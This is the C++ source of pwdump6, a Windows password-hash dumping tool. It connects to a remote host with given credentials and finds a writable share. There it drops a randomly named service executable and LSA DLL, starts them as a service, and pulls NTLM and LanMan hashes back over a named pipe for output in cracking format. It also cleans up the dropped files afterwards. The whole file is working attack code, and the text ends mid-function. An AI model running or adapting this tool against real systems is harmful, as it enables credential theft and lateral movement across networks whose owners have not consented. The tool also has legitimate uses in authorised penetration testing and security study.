/*
Copyright ©2009 foofus.net

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License Version 2, as published
by the Free Software Foundation.

This program is distributed in the hope that it will be useful, but WITHOUT
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  The program may contain errors that
could cause failures or loss of data, and may be incomplete or contain
inaccuracies.  By using the program, you expressly acknowledge and agree
that use of the program, or any portion thereof, is at your sole and entire
risk.  You are solely responsible for determining the appropriateness of
using, copying, distributing and modifying the program and assume all risks
of exercising your rights under the license, compliance with all applicable
laws, damage to or loss of data, programs or equipment, and unavailability
or interruption of operations.   THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
EXPRESSLY DISCLAIM ALL WARRANTIES AND/OR CONDITIONS, EXPRESS OR IMPLIED,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES AND/OR CONDITIONS OF
MERCHANTABILITY, OF SATISFACTORY QUALITY, OF FITNESS FOR A PARTICULAR
PURPOSE, OF ACCURACY, OF QUIET ENJOYMENT, AND NONINFRINGEMENT OF THIRD
PARTY RIGHTS.  THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES DO NOT WARRANT
AGAINST INTERFERENCE WITH YOUR ENJOYMENT OF THE PROGRAM, THAT THE FUNCTIONS
CONTAINED IN THE PROGRAM WILL MEET YOUR NEEDS, THAT THE OPERATION OF THE
PROGRAM WILL BE UNINTERRUPTED OR ERROR-FREE, OR THAT DEFECTS IN THE PROGRAM
WILL BE CORRECTED. THE DISCLAIMER OF WARRANTY CONSTITUTES AN ESSENTIAL PART
OF THE LICENSE TO USE THE PROGRAM AND NO USE OF THE PROGRAM IS AUTHORIZED
EXCEPT UNDER THE DISCLAIMER.  ALSO, SOME JURISDICTIONS DO NOT ALLOW THE
EXCLUSION OR LIMITATION OF INCIDENTAL OR CONSEQUENTIAL DAMAGES, SO THAT
EXCLUSION AND LIMITATION MAY NOT APPLY TO YOU.  See the GNU General Public
License Version 2 for more details.

You should have received a copy of the GNU General Public License Version 2
along with this program; if not, write to the Free Software Foundation, 59
Temple Place, Suite 330, Boston, MA 02111-1307 USA.
*/

/*
	Special thanks to Soaring Moe! for 64-bit contributions!
*/

#include <windows.h>
#include <initguid.h>
#include <stdio.h>
#include <conio.h>
#include <fstream>
#include <Lm.h>
#include <Process.h>
#include <time.h>
#include "ResourceLoader.h"
#include "resource.h"

// Visual Studio 2005 displays security warnings. This disables display of those warnings so the build 
// experience is like that with earlier DevStudio 6.
#pragma warning(disable : 4996)

#include "XGetopt.h"
#include "BlowfishStringConvert.h"

#define PWDUMP_VERSION	"2.0.0-beta-2"
#define PIPE_FORMAT		"%s\\pipe\\%s"
#define PIPE_TIMEOUT	1000
#define BUFSIZE			1500
#define CHARS_IN_GUID	39

typedef struct _USERINFO
{
	char cHash[64];			// Stores NTLM and LanMan hash data
	wchar_t wszUser[256];	// Stores the user's name
} USERINFO, *LPUSERINFO;

typedef struct {
  unsigned long P[16 + 2];
  unsigned long S[4][256];
} BLOWFISH_CTX;

extern "C"
{
	void Blowfish_Init(BLOWFISH_CTX *ctx, unsigned char *key, int keyLen);
	void Blowfish_Encrypt(BLOWFISH_CTX *ctx, unsigned long *xl, unsigned long *xr);
	void Blowfish_Decrypt(BLOWFISH_CTX *ctx, unsigned long *xl, unsigned long *xr);
}

bool GetPhysicalPathForShare(char* szServer, char* lpszShare, char** lpszPhysicalPath, int nBufferSize);
bool GetAvailableWriteableShare(char* szServer, int nPhysicalBufferSize, char** lplpPhysicalPath, int nUNCPathSize, char** lplpUNCPath);
bool CanUpload(char* szUploadPath);
void NamedPipeThread(void*);

HANDLE hStopEvent = NULL;
unsigned long hThread = NULL;
DWORD nThreadID;
USERINFO* lpUserInfoArray = NULL;
unsigned long nUserInfoArraySize = 0;
GUID guidPipe;
WCHAR wszGUID[CHARS_IN_GUID + 1];
char szGUID[CHARS_IN_GUID + 1];

BYTE* pEncryptionKey;
BLOWFISH_CTX ctx;

void Usage(char* szProgramName)
{
	fprintf(stderr, "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share][-i input_file] machineName\n", szProgramName);
	fprintf(stderr, "  where -h prints this usage message and exits\n");
	fprintf(stderr, "  where -o specifies a file to which to write the output\n");
	fprintf(stderr, "  where -u specifies the user name used to connect to the target\n");
	fprintf(stderr, "  where -p specifies the password used to connect to the target\n");
	fprintf(stderr, "  where -s specifies the share to be used on the target, rather than searching for one\n");
	fprintf(stderr, "  where -i specifies the input file for setting a hash for the specified user\n");
	fprintf(stderr, "  where -n skips password histories\n");
	fprintf(stderr, "  where -x targets a 64-bit host\n");
}

int GetRandomNumber(int nMinimum, int nMaximum)
{
	return (nMinimum + (rand() % (nMaximum - nMinimum))); 
}

bool GetRandomName(char** szBuffer, int nMinLength, int nMaxLength, char* szFileExtension = NULL)
{
	int nTotalLength = nMaxLength + 1;	// 1 accounts for the extra null termination
	int nRand;

	if (nMaxLength > MAX_PATH)
		return false;

	if (szFileExtension != NULL)
	{
		nTotalLength += strlen(szFileExtension) + 1;	// The extra 1 accounts for the "."
	}

	memset(*szBuffer, 0, nTotalLength);
	nRand = GetRandomNumber(nMinLength, nMaxLength);
	for (int i = 0; i < nRand; i++)
	{
		(*szBuffer)[i] = GetRandomNumber(0x61, 0x7a); 
	}

	if (szFileExtension != NULL)
	{
		strncat(*szBuffer, ".", 1);
		strncat(*szBuffer, szFileExtension, strlen(szFileExtension));
	}

	return true;
}

int main(int argc, char* argv[])
{
	char c;
	int i;
    char errMsg[1024];
    FILE* outfile = stdout;
    SC_HANDLE hscm = NULL;
    SC_HANDLE hsvc = NULL;
	char* szWritableShare = NULL;
	char* szWritableSharePhysical = NULL;
    char machineName[MAX_PATH];
    char* machineArg;
    char resourceName[MAX_PATH];
	char szFullServicePath[MAX_PATH];
	char szRemoteServicePath[MAX_PATH];
	char szRemoteLsaExtPath[MAX_PATH];
	char szFullLocalServicePath[MAX_PATH];
	char szFullLocalLsaExtPath[MAX_PATH];
    char pwBuf[256];
    char* password = NULL;
    char* userName = NULL;
    char localPath[MAX_PATH];
	char szDestinationServicePath[MAX_PATH];
	char szDestinationDllPath[MAX_PATH];
	char* szSelectedShareName = NULL;
    char* varg[8];
	char dwLen;
	SERVICE_STATUS statusService;
	BOOL bSkipHistories = FALSE;
	char szGUIDServiceName[CHARS_IN_GUID + 1];
	char* szServiceFileName;
	char* szLsaExtFileName;
	bool bIs64Bit = false;
	ResourceLoader rlLsaExt, rlPwServ;
	char szCurrentDir[MAX_PATH];
	bool bIsLocalRun = false;
	bool setPasswordHash = false;

	//OutputDebugString("PWDump Starting");

	srand((unsigned int)time(NULL));
	pEncryptionKey = NULL;

    if(argc < 2)
    {
		Usage(argv[0]);
        return 0;
    }

	/*
	fprintf(stderr, "\npwdump6 Version %s by fizzgig and the mighty group at foofus.net\n", PWDUMP_VERSION);
	fprintf(stderr, "** THIS IS A BETA VERSION! YOU HAVE BEEN WARNED. **\n");
    fprintf(stderr, "Copyright 2009 foofus.net\n\n");
    fprintf(stderr, "This program is free software under the GNU\n");
    fprintf(stderr, "General Public License Version 2 (GNU GPL), you can redistribute it and/or\n");
    fprintf(stderr, "modify it under the terms of the GNU GPL, as published by the Free Software\n");
    fprintf(stderr, "Foundation.  NO WARRANTY, EXPRESSED OR IMPLIED, IS GRANTED WITH THIS\n");
    fprintf(stderr, "PROGRAM.  Please see the COPYING file included with this program\n");
    fprintf(stderr, "and the GNU GPL for further details.\n\n" );
	*/

	while ((c = getopt(argc, argv, "xnhu:o:p:s:i:")) != EOF)
	{
		switch(c)
		{
		case 'h':
			// Print help and exit
			Usage(argv[0]);
			return 0;
			break;
		case 'u':
			// Set the user name
            userName = optarg;
			break;
		case 'o':
			// Set the output file name - opened in Unicode
            outfile = fopen(optarg, "w, ccs=UTF-16LE");
            if(!outfile)
            {
                sprintf(errMsg, "Couldn't open %s for writing.\n", optarg);
                throw errMsg;
            }
			break;
		case 'p':
			// Set the password
			password = optarg;
			break;
		case 's':
			// Force this share to be used for uploading
			szSelectedShareName = optarg;
			break;
		case 'n':
			// Do not dump password histories
			bSkipHistories = true;
			break;
		case 'i':
			setPasswordHash = true;
			break;
		case 'x':
			// Target x64
			bIs64Bit = true;
			break;
		default:
			printf("Unrecognized option: %c\n", c);
			break;
		}
	}
	
	// At this point, should have optarg pointing to at least the machine name
	if (optarg == NULL)
	{
		// No machine
		fprintf(stderr, "No target specified\n\n");
		Usage(argv[0]);
		return 0;
	}

	machineArg = optarg;
    while(*machineArg == '\\') 
		machineArg++;

    sprintf(machineName, "\\\\%s", machineArg);

	if (stricmp(machineName, "\\\\localhost") == 0 || stricmp(machineName, "\\\\127.0.0.1") == 0 || 
		stricmp(machineName, "localhost") == 0 || stricmp(machineName, "127.0.0.1") == 0)
	{
		bIsLocalRun = true;
	}

	// Prompt for a password if a user but no password is specified
	if (password == NULL && userName != NULL)
	{
		i = 0;
		c = 0;
		fprintf(stderr, "Please enter the password > " );
		while(c != '\r')
		{
			c = _getch();
			pwBuf[i++] = c;
			_putch('*');
		}
		pwBuf[--i] = 0;
		_putch('\r');
		_putch('\n');

		password = (char*)pwBuf;
	}

	memset(resourceName, 0, MAX_PATH);
	memset(szFullLocalServicePath, 0, MAX_PATH);
	memset(szFullLocalLsaExtPath, 0, MAX_PATH);
	memset(szRemoteServicePath, 0, MAX_PATH);
	memset(szRemoteLsaExtPath, 0, MAX_PATH);
	memset(szDestinationServicePath, 0, MAX_PATH);
	memset(szDestinationDllPath, 0, MAX_PATH);

	if (GetCurrentDirectory(MAX_PATH, szCurrentDir) == 0)
	{
		// Can't get the current working dir?!?!? WTF?
		fprintf(stderr, "Unable to get the current working directory\n");
		return -1;
	}

	//printf("Current directory for pwdump is %s\n", szCurrentDir);

	szServiceFileName = (char*)malloc(MAX_PATH + 1);
	szLsaExtFileName = (char*)malloc(MAX_PATH + 1);

	// Generate a random name for the service (and file) and DLL
	if (!GetRandomName((char**)&szServiceFileName, 5, 10))
	{
		sprintf(errMsg, "Filename size mismatch\n");
		throw errMsg;
	}
	if (!GetRandomName((char**)&szLsaExtFileName, 5, 10))
	{
		sprintf(errMsg, "Filename size mismatch\n");
		throw errMsg;
	}

	sprintf(szFullLocalServicePath, "%s\\%s.exe", szCurrentDir, szServiceFileName);
	sprintf(szFullLocalLsaExtPath, "%s\\%s.dll", szCurrentDir, szLsaExtFileName);
	//sprintf(szFullLocalServicePath, "%s\\servpw.exe", szCurrentDir);
	//sprintf(szFullLocalLsaExtPath, "%s\\lsremora.dll", szCurrentDir);

	// Pull the resources out of the EXE and put them on the file system
	// We will use the resources appropriate to the target (32 vs. 64-bit)
	if (bIs64Bit)
	{
		rlLsaExt.UnpackResource(IDR_LSAEXT64, szFullLocalLsaExtPath);
		rlPwServ.UnpackResource(IDR_PWSERV64, szFullLocalServicePath);
	}
	else
	{
		rlLsaExt.UnpackResource(IDR_LSAEXT, szFullLocalLsaExtPath);
		rlPwServ.UnpackResource(IDR_PWSERV, szFullLocalServicePath);
	}

	// If we're running against the local machine, don't bother doing any of the networking stuff.
	// It actually prevents pwdump from running if networking is disabled.
	if (bIsLocalRun)
	{
		strncpy(szFullServicePath, szFullLocalServicePath, MAX_PATH);
		strncpy(szRemoteServicePath, szFullLocalServicePath, MAX_PATH);
		strncpy(szRemoteLsaExtPath, szFullLocalLsaExtPath, MAX_PATH);

		/*if (bIs64Bit)
			sprintf(szFullServicePath, "%s\\servpw64.exe", szCurrentDir);
		else
			sprintf(szFullServicePath, "%s\\servpw.exe", szCurrentDir);*/
	}
	else
	{
		try
		{
			// connect to machine
			NETRESOURCE rec;
			int rc;
			rec.dwType = RESOURCETYPE_DISK;
			rec.lpLocalName = NULL;
			rec.lpProvider = NULL;

			szWritableShare = (char*)malloc(MAX_PATH + 1);
			szWritableSharePhysical = (char*)malloc(MAX_PATH + 1);
			memset(szWritableShare, 0, MAX_PATH + 1);
			memset(szWritableSharePhysical, 0, MAX_PATH + 1);

			GetModuleFileName(NULL, localPath, MAX_PATH);
       
			if (szSelectedShareName == NULL)
			{
				// Need to establish a connection to enumerate shares sometimes
				sprintf(resourceName, "%s\\IPC$", machineName);
				rec.lpRemoteName = resourceName;
				rc = WNetAddConnection2(&rec, password, userName, 0);
				if(rc != ERROR_SUCCESS)
				{
					sprintf(errMsg, "Logon to %s failed: error %d\n", resourceName, rc);
					throw errMsg;
				}
				
				if (!GetAvailableWriteableShare(machineName, MAX_PATH, &szWritableSharePhysical, MAX_PATH, &szWritableShare))
				{
					sprintf(errMsg, "Unable to find writable share on %s\n", machineName);
					throw errMsg;
				}
			}
			else
			{
				// For a known share, connect first to establish a trusted connection, then get details about the share
				sprintf(resourceName, "%s\\%s", machineName, szSelectedShareName);
				rec.lpRemoteName = resourceName;
				rc = WNetAddConnection2(&rec, password, userName, 0);
				if(rc != ERROR_SUCCESS)
				{
					sprintf(errMsg, "Logon to %s failed: error %d\n", resourceName, rc);
					throw errMsg;
				}

				if (!CanUpload(resourceName))
				{
					sprintf(errMsg, "Failed to upload to the specified share on %s\n", machineName);
					throw errMsg;
				}

				if (!GetPhysicalPathForShare(machineName, szSelectedShareName, &szWritableSharePhysical, MAX_PATH))
				{
					sprintf(errMsg, "Failed to get the physical path for the specified share on %s\n", machineName);
					throw errMsg;
				}

				strncpy(szWritableShare, resourceName, MAX_PATH);
			}

			if (strlen(szWritableShare) <= 0 || strlen(szWritableSharePhysical) <= 0/* || strlen(szLocalDrive) <= 0*/)
			{
				sprintf(errMsg, "Unable to find a writable share on %s\n", machineName);
				throw errMsg;
			}

			sprintf(szRemoteServicePath, "%s\\%s.exe", szWritableSharePhysical, szServiceFileName);
			sprintf(szRemoteLsaExtPath, "%s\\%s.dll", szWritableSharePhysical, szLsaExtFileName);

			 // Copy dll file to remote machine
			/*strcpy(rDllname, szWritableShare);
			if (bIs64Bit)
			{
				strcpy(strrchr(localPath, '\\') + 1, "lsremora64.dll");
				strcat(rDllname, "\\lsremora64.dll");
			}
			else
			{
				strcpy(strrchr(localPath, '\\') + 1, "lsremora.dll");
				strcat(rDllname, "\\lsremora.dll");
			}*/

			strncpy(szDestinationServicePath, szWritableShare, MAX_PATH);
			strncat(szDestinationServicePath, "\\", 1);
			strncat(szDestinationServicePath, szServiceFileName, MAX_PATH);
			strncat(szDestinationServicePath, ".exe", 4);

			// Uh, why not just COPY the file rather than its stream?
			if (!CopyFile(szFullLocalServicePath, szDestinationServicePath, FALSE))
			{
				sprintf(errMsg, "Couldn't copy %s to destination %s. (Error %d)\n", szRemoteServicePath, szDestinationServicePath, GetLastError());
				throw errMsg;
			}

			// Copy the service file to remote machine
			/*if (bIs64Bit)
				strcpy(strrchr(localPath, '\\') + 1, "servpw64.exe");
			else
				strcpy(strrchr(localPath, '\\') + 1, "servpw.exe");

			strcpy(rExename, szWritableShare);
			strcat(rExename, "\\");
			strcat(rExename, szServiceFileName);
			strcat(rExename, ".exe");*/

			strncpy(szDestinationDllPath, szWritableShare, MAX_PATH);
			strncat(szDestinationDllPath, "\\", 1);
			strncat(szDestinationDllPath, szLsaExtFileName, MAX_PATH);
			strncat(szDestinationDllPath, ".dll", 4);

			if (!CopyFile(szFullLocalLsaExtPath, szDestinationDllPath, FALSE))
			{
				sprintf(errMsg, "Couldn't copy %s to destination %s.\n", szRemoteLsaExtPath, szDestinationDllPath);
				throw errMsg;
			}
		}
		catch(char* msg)
		{
			WNetCancelConnection2(resourceName, 0, false);

			if(msg) 
				printf(msg);
			
			if(outfile) 
				fclose(outfile);

			if (szWritableShare != NULL)
				free(szWritableShare);

			if (szWritableSharePhysical != NULL)
				free(szWritableSharePhysical);

#ifdef _DEBUG
			printf("Press return to exit...\n");
			scanf("...");
#endif
			return -1;
		}
	}

	try
	{
		// Need to create a guid for the pipe name
		memset(wszGUID, 0, CHARS_IN_GUID + 1);
		memset(szGUID, 0, CHARS_IN_GUID + 1);

		CoCreateGuid(&guidPipe);
		StringFromGUID2(guidPipe, wszGUID, CHARS_IN_GUID);
		wsprintf(szGUID, "%ls", wszGUID);

        // establish the service on remote machine
		if (!bIsLocalRun)
			hscm = OpenSCManager(machineName, NULL, SC_MANAGER_CREATE_SERVICE); // Remote service connection
		else
			hscm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE); // Local service connection

        if(!hscm)
        {
            sprintf(errMsg, "Failed to open SCM\n");
            throw errMsg;
        }

 		CoCreateGuid(&guidPipe);
		StringFromGUID2(guidPipe, wszGUID, CHARS_IN_GUID);
		wsprintf(szGUIDServiceName, "%ls", wszGUID);
		
		// Give the service a GUID name
		//strncpy(szServiceFileName, "servpw", MAX_PATH);
		//printf("My service file name is: %s\n", szServiceFileName);
		hsvc = CreateService(hscm, szServiceFileName, szGUIDServiceName, SERVICE_ALL_ACCESS, 
                             SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                             szRemoteServicePath, NULL, NULL, NULL, NULL, NULL);
        if(!hsvc)
        {
			int n = GetLastError();
            hsvc = OpenService(hscm, szServiceFileName, SERVICE_ALL_ACCESS);
            if(!hsvc)
            {
                sprintf(errMsg, "Failed to create service (%s/%s), error %d\n", szFullServicePath, szGUIDServiceName, GetLastError());
                throw errMsg;
            }
        }

	 	// Open named pipe
		hThread = _beginthreadex(NULL, 0, (unsigned (_stdcall *)(void *))NamedPipeThread, (void*)machineName, 0, (unsigned*)&nThreadID);
		if (hThread == NULL)
		{
            sprintf(errMsg, "Unable to create named pipe thread, error %d\n", GetLastError());
            throw errMsg;
		}

		// Create a 16 byte encryption key
		// ** THIS IS NOT A CRYPTOGRAPHICALLY STRONG SOLUTION!!!! **
		// You have been warned
		
		LARGE_INTEGER liSeed;
		
		pEncryptionKey = (BYTE*)malloc(16);
		for (i = 0; i < 16; i++)
		{
			QueryPerformanceCounter(&liSeed);
			srand(liSeed.LowPart);
			pEncryptionKey[i] = rand() & 0xff;

			// HACK FIX!!! //
			// Encryption breaks if there is a zero byte in the key //
			if (pEncryptionKey[i] == 0)
				pEncryptionKey[i] = 1;
			//pEncryptionKey[i] = 1;
		}

		// Set up service params. Need to set up a temporary char array so that
		// non-strings can be null-terminated.
		char szTemp1[2], szTemp2[2];

		memset(szTemp1, 0, 2);
		memset(szTemp2, 0, 2);

		dwLen = 16;
        varg[0] = szGUID;
		varg[1] = (char*)pEncryptionKey;
		varg[4] = szServiceFileName;
		varg[5] = szRemoteLsaExtPath;
		varg[6] = szCurrentDir;

		if (setPasswordHash) {
			varg[7] = "set";
		} else {
			varg[7] = "dump";
		}
		memcpy(szTemp1, &dwLen, 1);
		varg[2] = szTemp1;
		
		szTemp2[0] = (char)bSkipHistories;
		varg[3] = szTemp2;

		Blowfish_Init(&ctx, pEncryptionKey, dwLen);

		if(!StartService(hsvc, 8, (const char**)varg))
		{
            sprintf(errMsg, "Service start failed: %d (%s/%s)\n", GetLastError(), szRemoteServicePath, szGUIDServiceName);
            throw errMsg;
		}

        // when the executable is finished running, it can be deleted - clean up
		BOOL bRet;

        for(i = 0; ; i++)
        {
            if(i == 99)
                fprintf(stderr, "Waiting for remote service to terminate...\n");
            else if(i == 199)
                fprintf(stderr, "Servers with many user accounts can take several minutes\n");
            else if(i % 100 == 99)
                fprintf(stderr, ".");

            Sleep(100);

			if (szDestinationServicePath[0] != 0)
			{
				if(DeleteFile(szDestinationServicePath))
					break;
			}
			else
			{
				// If we're running locally, just query the service's status
				bRet = QueryServiceStatus(hsvc, &statusService);
				if (!bRet)
				{
					fprintf(stderr, "Unable to query service status. Something is wrong, please manually check the status of servpw\n");	
					break;
				}

				if (statusService.dwCurrentState == SERVICE_STOPPED)
					break;
			}
        }

        fprintf(stderr, "\n");

		if (szDestinationDllPath[0] != 0)
		{      
			if(!DeleteFile(szDestinationDllPath))
				fprintf(stderr, "Couldn't delete target executable from remote machine: %d\n", GetLastError());
		}

		WaitForSingleObject((void*)hThread, INFINITE);

		// Go through each structure and output the password data
		if (lpUserInfoArray == NULL)
		{
			printf("No data returned from the target host\n");
		}
		else
		{
			USERINFO* pTemp;
            wchar_t LMdata[40];
            wchar_t NTdata[40];
            wchar_t *p;
            int i;

			for (unsigned long index = 0; index < nUserInfoArraySize; index++)
			{
				pTemp = lpUserInfoArray + index;

				DWORD* dwdata = (DWORD*)(pTemp->cHash);

				// Get LM hash
                if((dwdata[4] == 0x35b4d3aa) && (dwdata[5] == 0xee0414b5) &&
                   (dwdata[6] == 0x35b4d3aa) && (dwdata[7] == 0xee0414b5))
				{
                    swprintf(LMdata, L"NO PASSWORD*********************");
				}
                else 
				{
					for(i = 16, p = LMdata; i < 32; i++, p += 2)
					{
						swprintf(p, L"%02X", pTemp->cHash[i] & 0xFF);
					}
				}

                // Get NT hash
                if((dwdata[0] == 0xe0cfd631) && (dwdata[1] == 0x31e96ad1) &&
                   (dwdata[2] == 0xd7593cb7) && (dwdata[3] == 0xc089c0e0))
				{
                    swprintf(NTdata, L"NO PASSWORD*********************");
				}
                else 
				{
					for(i = 0, p = NTdata; i < 16; i++, p += 2)
					{
						swprintf(p, L"%02X", pTemp->cHash[i]  & 0xFF);
					}
				}

                // display data in L0phtCrack-compatible format
				// Try converting data to Unicode
                fwprintf(outfile, L"%ls:%ls%ls\n", pTemp->wszUser, NTdata, LMdata);
			}
		}

        throw "Completed.\n";
    }

    // clean up
    catch(char* msg)
    {
		if (pEncryptionKey != NULL)
		{
			memset(pEncryptionKey, 0, 16);
			free(pEncryptionKey);
		}

		if (lpUserInfoArray != NULL)
			GlobalFree(lpUserInfoArray);

        if(hsvc)
        {
            DeleteService(hsvc);
            CloseServiceHandle(hsvc);
        }

        if(hscm) 
			CloseServiceHandle(hscm);
		
		if (resourceName[0] != 0)
			WNetCancelConnection2(resourceName, 0, false);

        if(msg) {
			// Do not print the completed message
        	if (strcmp(msg, "Completed.\n")) {
				printf(msg);
			}
		}
		
        if(outfile) 
			fclose(outfile);

		if (szWritableShare != NULL)
			free(szWritableShare);

		if (szWritableSharePhysical != NULL)
			free(szWritableSharePhysical);

	}

#ifdef _DEBUG
	printf("Press return to exit...\n");
	scanf("...");
#endif

    return 0;
}

bool CanUpload(char* szUploadPath)
{
	char szTempFilename[MAX_PATH];
	NETRESOURCE nr; 

	::ZeroMemory(&nr, sizeof(NETRESOURCE));
	::ZeroMemory(szTempFilename, MAX_PATH);
	_snprintf(szTempFilename, MAX_PATH, "%s\\test.pwd", szUploadPath);

	std::ofstream outputFile(szTempFilename, std::ios::out | std::ios::trunc);
	outputFile.write("success", 7);
	if (outputFile.fail())
	{
		fprintf(stderr, "Error writing the test file %s, skipping this share\n", szUploadPath);
		return false;
	}

	outputFile.flush();
	//fprintf(stderr, "Able to write to this directory, using location %s for cachedump\n", szUploadPath);
	outputFile.close();
	DeleteFile(szTempFilename);

	return true;
}

bool GetAvailableWriteableShare(char* szServer, int nPhysicalBufferSize, char** lplpPhysicalPath, int nUNCPathSize, char** lplpUNCPath)
{
	// Returns the drive letter if successful, otherwise 0
	PSHARE_INFO_2 BufPtr, p;
	NET_API_STATUS res;
	DWORD er = 0, tr = 0, resume = 0, i;
	wchar_t server[MAX_PATH];
	char szTemp[MAX_PATH], szTemp2[MAX_PATH];
	bool bFound = false;
	char szServerWithSlashes[MAX_PATH];

	::ZeroMemory(server, MAX_PATH);
	::ZeroMemory(szServerWithSlashes, MAX_PATH);
	::ZeroMemory(*lplpPhysicalPath, nPhysicalBufferSize);
	::ZeroMemory(*lplpUNCPath, nUNCPathSize);
	//_snprintf(szServerWithSlashes, MAX_PATH, "\\\\%s", szServer);
	_snprintf(szServerWithSlashes, MAX_PATH, "%s", szServer);
	mbstowcs(server, szServerWithSlashes, strlen(szServerWithSlashes));

	do
	{
		// Fuck Microsoft and it's lame-ass unicode crap
		res = NetShareEnum(server, 2, (LPBYTE*)&BufPtr, -1, &er, &tr, &resume);
		if(res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
		{
			p = BufPtr;
			for(i = 1; i <= er; i++)
			{
				::ZeroMemory(szTemp, MAX_PATH);
				wcstombs(szTemp, (LPWSTR)(p->shi2_netname), MAX_PATH);

				// Look for shares that are not SYSVOL or NETLOGON, and that have a physical path
				if (stricmp(szTemp, "SYSVOL") != 0 && stricmp(szTemp, "NETLOGON") != 0 && wcslen((LPWSTR)(p->shi2_path)) > 0)
				{
					// If this is a potentially workable share, try uploading something
					memset(szTemp2, 0, MAX_PATH);
					_snprintf(szTemp2, MAX_PATH, "%s\\%s", szServerWithSlashes, szTemp);
					if (CanUpload(szTemp2))
					{
						// Success!
						// Copy the physical path to the out variable
						wcstombs(szTemp, (LPWSTR)(p->shi2_path), MAX_PATH);
						strncpy(*lplpPhysicalPath, szTemp, nPhysicalBufferSize);

						// Also copy the UNC path to the out variable
						strncpy(*lplpUNCPath, szTemp2, nUNCPathSize);
						bFound = true;
						break;
					}

					// Otherwise continue and try another share
				}
				
				p++;
			}

			NetApiBufferFree(BufPtr);
		}
		else 
			fprintf(stderr, "GetAvailableWriteableShare returned an error of %ld\n",res);
	}
	while (res == ERROR_MORE_DATA); // end do

	return bFound;
}

bool GetPhysicalPathForShare(char* szServer, char* lpszShare, char** lpszPhysicalPath, int nBufferSize)
{
	PSHARE_INFO_502 BufPtr;
	NET_API_STATUS res;
	wchar_t share[MAX_PATH];
	wchar_t server[MAX_PATH];
	char szTemp[MAX_PATH];
	char szServerWithSlashes[MAX_PATH];
	bool bRet = false;


	::ZeroMemory(server, MAX_PATH);
	::ZeroMemory(share, MAX_PATH);
	::ZeroMemory(szServerWithSlashes, MAX_PATH);
	::ZeroMemory(*lpszPhysicalPath, nBufferSize);
	_snprintf(szServerWithSlashes, MAX_PATH, "%s", szServer);
	mbstowcs(server, szServerWithSlashes, strlen(szServerWithSlashes));
	mbstowcs(share, lpszShare, strlen(lpszShare));
  
	// Try to get share information
	res = NetShareGetInfo(server, share, 502, (LPBYTE*)&BufPtr);
	if(res == ERROR_SUCCESS)
	{
		// It is assumed that we've already tested for whether we can write to this share
		::ZeroMemory(szTemp, MAX_PATH);
		wcstombs(szTemp, (LPWSTR)(BufPtr->shi502_netname), MAX_PATH);

		// Copy the physical path to the out variable
		wcstombs(szTemp, (LPWSTR)(BufPtr->shi502_path), MAX_PATH);
		strncpy(*lpszPhysicalPath, szTemp, nBufferSize);
		bRet = true;

		NetApiBufferFree(BufPtr);
		return bRet;
	}
	else
	{
			printf("GetPhysicalPathForShare returned an error of %ld, are you sure the share you specified exists?\n", res);
	}

	return false;

}

void NamedPipeThread(void* pParam)
{
 	HANDLE hFile=INVALID_HANDLE_VALUE;
	char chBuf[BUFSIZE]; 
	BOOL fSuccess; 
	DWORD cbRead, dwMode;
	char szPipeName[MAX_PATH];
	char szOutputBuffer[2 * MAX_PATH];
	DWORD dwDataChunk1, dwDataChunk2;
	char* lpszServer = (char*)pParam; // pParam is the name of the server to connect to
    int i;

	::ZeroMemory(szPipeName, MAX_PATH);
	::ZeroMemory(szOutputBuffer, 2 * MAX_PATH);

	int nError = 2;
	if (stricmp(lpszServer, "\\\\localhost") == 0 || stricmp(lpszServer, "\\\\127.0.0.1") == 0)
	{
		_snprintf(szPipeName, MAX_PATH, PIPE_FORMAT, "\\\\.", szGUID);
		while (nError == 2)
		{
			BOOL bPipe = WaitNamedPipe(szPipeName, 30000);
			if (!bPipe)
			{
				// Error 2 means the pipe is not yet available, keep trying
				nError = GetLastError();
				Sleep(100);
			}
			else
				nError = 0;
		}
		hFile = CreateFile(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);	

		while(GetLastError() == ERROR_PIPE_BUSY)
		{ 
			Sleep(100);
			hFile = CreateFile(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);	
		}

		if(hFile == INVALID_HANDLE_VALUE)
		{ 
			printf("CreateFile failed to create a new client-side pipe: error %d\n", GetLastError());
			return;
		} 
	}
	else
	{
		_snprintf(szPipeName, MAX_PATH, PIPE_FORMAT, lpszServer, szGUID);
		while (nError == 2)
		{
			BOOL bPipe = WaitNamedPipe(szPipeName, 30000);
			if (!bPipe)
			{
				// Error 2 means the pipe is not yet available, keep trying
				nError = GetLastError();
				Sleep(100);
			}
			else
				nError = 0;
		}
		hFile = CreateFile(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);	

		if(hFile == INVALID_HANDLE_VALUE)
		{ 
			printf("CreateFile failed to create a new client-side pipe: error %d\n", GetLastError());
			return;
		}
	}

	do 
	{ 
		dwMode = PIPE_READMODE_MESSAGE; 
		fSuccess = SetNamedPipeHandleState(hFile, &dwMode, NULL, NULL); 
		if (!fSuccess) 
		{
			printf("SetNamedPipeHandleState failed, error %d\n", GetLastError()); 
			return;
		}

		::ZeroMemory(chBuf, BUFSIZE);
		fSuccess = ReadFile(hFile, chBuf, BUFSIZE, &cbRead, NULL); 
		if (!fSuccess) 
		{ 
			printf("ReadFile failed with %d.\n", GetLastError()); 
			break;
		} 
		else
		{
			// Received a valid message - decode it
			if (cbRead >= 3)
			{
				if (chBuf[0] == 0)
				{
					// Terminate the thread
					// Need to connect once more here so that the target knows the message has been received and unblocks
					CloseHandle(hFile);
					hFile=INVALID_HANDLE_VALUE;
					/*hFile = CreateFile(szPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
					if(hFile == INVALID_HANDLE_VALUE)
					{ 
						printf("CreateFile failed to create a new client-side pipe: error %d\n", GetLastError());
						return;
					}*/
					break;
				}
				else if (chBuf[0] == 2)
				{
